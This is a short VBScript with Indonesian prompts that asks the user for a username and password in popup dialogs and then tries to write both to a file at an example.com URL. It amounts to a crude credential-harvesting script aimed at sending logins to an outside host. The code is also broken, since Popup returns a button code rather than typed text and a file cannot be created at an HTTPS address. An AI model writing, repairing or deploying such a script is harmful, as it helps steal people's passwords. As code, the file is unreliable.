Dim objTextBox, username, password

Set objTextBox = WScript.CreateObject("WScript.Shell")
username = objTextBox.Popup("Masukkan username Anda:", 0, "Input username", 0 + 1)
password = objTextBox.Popup("Masukkan password Anda:", 0, "Input password", 0 + 1)

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("https://example.com/username_password.txt", True)

objFile.WriteLine "Username: " & username
objFile.WriteLine "Password: " & password

objFile.Close